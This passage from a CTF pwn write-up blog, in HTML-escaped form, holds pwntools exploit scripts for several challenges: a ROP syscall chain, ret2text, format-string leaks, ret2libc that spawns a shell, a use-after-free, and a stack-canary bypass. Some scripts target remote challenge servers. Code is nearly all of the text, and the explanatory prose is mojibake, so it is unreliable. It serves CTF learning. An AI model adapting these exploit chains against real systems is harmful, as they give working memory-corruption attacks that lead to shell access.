pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscall</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"sdctf-2022horoscope\"><a class=\"anchor\" href=\"#sdctf-2022horoscope\">#</a> [SDCTF 2022]Horoscope</h5>\n<blockquote>\n<p>åˆ©ç”¨è¿™ä¸ª atoi å»æ˜¯ a1 ç­‰äº 1 è¿™ä¸ª s çš„è¯æ˜¯éœ€è¦ä½¿ç”¨ 0x38 æ‰èƒ½æº¢å‡ºï¼Œé‚£ä¹ˆçš„è¯åˆ©ç”¨ä½¿ä¸€ä¸ª b'a'*0x38 ç­‰äº b'1'+b'a'*0x38 å› ä¸º atoi åªä¼šè½¬æ¢æ•°å­—ä¸ºæ•´æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å»å¾—åˆ°è®©è¿™ä¸ªç¨‹åºå®Œæ•´è¿è¡Œï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªç®€å•çš„ ret2text äº†</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28120)</span><br><span class=\"line\">p=process(&#x27;./horoscope&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;horoscope&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x30+0x7)+p64(elf.sym[&#x27;debug&#x27;])+p64(elf.sym[&#x27;test&#x27;])</span><br><span class=\"line\">payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x37)+p64(0x40095F)</span><br><span class=\"line\">p.sendlineafter(b&#x27;pe&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop2\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop2\">#</a> [BJDCTF 2020]babyrop2</h5>\n<blockquote>\n<p>è¿™ä¸ªé¢˜è®²ç©¶çš„æ˜¯ ret2libc æ³¨æ„å­—ç¬¦ä¸²æº¢å‡ºä¸º 7 å³å¯æŒ‰ç…§ ret2libc æ‰“å°±è¡Œ</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28241)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;u!\\n&#x27;,&#x27;%7$p&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;0x&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=int(p.recv(16),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(a))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi=0x400993</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">vuln=elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4005f9</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;ory!\\n&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">base_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(base_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts=LibcSearcher(&#x27;puts&#x27;,base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=base_addr-puts.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+puts.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">bin_sh=libc_base+puts.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;ory!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020ydsneedgirlfriend\"><a class=\"anchor\" href=\"#bjdctf-2020ydsneedgirlfriend\">#</a> [BJDCTF 2020]YDSneedGirlfriend</h5>\n<blockquote>\n<p>è¿™ä¸ªé¢˜åˆæ˜¯ä¸€ä¸ªå †çš„é¢˜è¦å¥½å¥½çš„åˆ©ç”¨ uaf å»å¾—åˆ° shell<br />\n é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰ä¸€ä¸ª free æ¥é‡Šæ”¾å†…å­˜ä½†æ˜¯å¹¶æ²¡æœ‰ç»™æŒ‡é’ˆæ¸…é›¶å¯¼è‡´å†æ¬¡åˆ†é…æ—¶åœ¨è¢«å ç”¨ï¼Œå¹¶ä¸” show å‡½æ•°å¯ä»¥æ¥è°ƒç”¨æŒ‡é’ˆæŒ‡åˆ°çš„å‡½æ•°å°†è¢«è°ƒç”¨</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(&#x27;node4.anna.nssctf.cn&#x27;,28732)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def add(size,name):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.recvuntil(&#x27;size is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.recvuntil(&#x27;ame is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"># Â  Â sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def delete(index):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.recvuntil(&#x27;Index :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"># Â  Â sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def show(idx):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.recvuntil(&#x27;choice :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendline(&#x27;3&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  sh.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">sh.recvuntil(&quot;oice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,&#x27;aaaaa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x20,&#x27;bbbbb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(0)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =p64(0x400B9C)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(0)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023å¥‡æ€ªçš„elf\"><a class=\"anchor\" href=\"#gdouctf-2023å¥‡æ€ªçš„elf\">#</a> [GDOUCTF 2023] å¥‡æ€ªçš„ ELF</h5>\n<blockquote>\n<p>ä¸€ä¸ªç¦»è°±çš„æ¶æ„é¢˜ç›®ï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªæ˜¯ x86_64 (arm64) ä¸€ä¸ªæ˜¯ arm64 æ‰€ä»¥ç¬¬äºŒä¸ªå› ä¸ºç¯å¢ƒåŸå› æ— æ³•è¿è¡Œï¼ŒæŠŠ linux2 é‡Œé¢çš„ flag è½¬æ¢ä¸º 16 è¿›åˆ¶ç„¶ååœ¨ python è¿›è¡Œä¸€æ¬¡å¼‚æˆ–è¿ç®—å³å¯å¾—åˆ° flag2</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=[</span><br><span class=\"line\">Â  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,</span><br><span class=\"line\">Â  0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB</span><br><span class=\"line\">]</span><br><span class=\"line\">for i in flag:</span><br><span class=\"line\">Â  Â  print(chr(i^0x86),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023makewish\"><a class=\"anchor\" href=\"#hdctf-2023makewish\">#</a> [HDCTF 2023]Makewish</h5>\n<blockquote>\n<p>è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€éœ€è¦è‡ªå·±å¤šæ¬¡è°ƒè¯•æ‰èƒ½çŸ¥é“å…·ä½“çš„è§£å†³åŠæ³•ç»¼åˆäº†å‰é¢çš„å¾ˆå¤šçŸ¥è¯†ç‚¹</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes #è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªä¼ªéšæœºæ•°</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27; #æ—¥å¿—</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(1) #srand</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">\tp=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">\t#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28492)</span><br><span class=\"line\">\tpayload=b&#x27;a&#x27;*(0x30-0x8)</span><br><span class=\"line\">\tp.sendline(payload)</span><br><span class=\"line\">\tp.recvuntil(payload)</span><br><span class=\"line\">\tcanary=u64(p.recv(8))-0x0a</span><br><span class=\"line\">\tlog.info(hex(canary))</span><br><span class=\"line\">\trand=libc.rand()%1000+324</span><br><span class=\"line\">\tp.sendafter(&#x27;key\\n&#x27;,p32(rand))</span><br><span class=\"line\">\tpayload=p64(0x4007C7)+p64(canary)</span><br><span class=\"line\">\tp.sendlineafter(&#x27;me&#x27;,payload)</span><br><span class=\"line\">\tp.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>åˆ©ç”¨ puts å¾—åˆ° canaryã€‚</p>\n<h5 id=\"ciscn-2019åä¸­pwn1\"><a class=\"anchor\" href=\"#ciscn-2019åä¸­pwn1\">#</a> [CISCN 2019 åä¸­] PWN1</h5>\n<p>å¸¸è§„ ret2libc ç›´æ¥æ‰“</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./CISCN_PWN1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28793)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">Padding = b&#x27;\\x00&#x27; + b&#x27;A&#x27; * (0x50 + 0x08 - 0x01)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">main = elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400C83</span><br><span class=\"line\">ret = 0x4006B9</span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\">Payload = Padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;Ciphertext\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:6].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;, addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr = addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">sh_addr = libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span 